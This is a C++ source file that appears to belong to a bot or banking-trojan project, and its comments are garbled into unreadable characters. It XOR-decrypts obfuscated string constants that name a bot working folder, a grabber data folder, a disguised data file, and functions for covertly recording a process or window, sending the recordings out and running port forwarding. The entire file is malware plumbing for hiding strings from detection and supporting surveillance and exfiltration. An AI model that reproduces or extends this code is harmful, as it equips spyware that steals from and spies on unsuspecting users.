//---------------------------------------------------------------------------

#pragma hdrstop

#include "StrConsts.h"
#include "Config.h"
#include "Crypt.h"
//---------------------------------------------------------------------------


extern CSSTR BeginCryptBlock[];
extern CSSTR EndCryptBlock[];



//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr)
{
	string Result = EncryptedStr;

	bool Encrypted = !Result.IsEmpty() && EncryptedStr > BeginCryptBlock &&
					 EncryptedStr < EndCryptBlock && EncryptedStr[0] != 'C' &&
					 BeginCryptBlock[0] != 'C';

	if (Encrypted)
	{
		// �������������� ������
		XORCrypt::Crypt(GetStringsPassword(), (LPBYTE)Result.t_str(), Result.Length());
	}

	return Result;
}
//-----------------------------------------------------------------------------



//==================================================//
CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
//=============================================================================
//  ���� �������� ����������� �����.
//  ��� ������ ����������� ���� � �� �����������
//  CSEND
//  ����� ����������� ��������
//=============================================================================


CSSTR StrBotWorkPath[] = "WnsBMT"; // ������� ������� ����
CSSTR StrGrabberPath[] = "gdata";  // ��� ������� ����� �������

// ����� ��������� �����
CSSTR StrPrefixFileName[] = "mnprsdd.dat"; // ���� �������� ��������



// ����� ������� ���������� �����������.
CSSTR VideRecFuncRecordProcess[]  = "StartRecPid";
CSSTR VideRecFuncRecordWnd[]      = "StartRecHwnd";
CSSTR VideRecFuncStop[]           = "StopRec";
CSSTR VideRecFuncResetTimer[]     = "ResetTimer";
CSSTR VideRecFuncSendData[]       = "StartSend";
CSSTR VideRecFuncRunPortForward[] = "RunPortForward";


//=============================================================================
// ����� ����� ����������� �����
//=============================================================================
CSSTR EndCryptBlock[] = ENCRYPTED_STRINGS_END; //
//=============================================//





//-----------------------------------------------------------------------------
// �� ����������� ������
//-----------------------------------------------------------------------------

CSSTR Slash[]   = "\\";
CSSTR SlashChar = '\\';
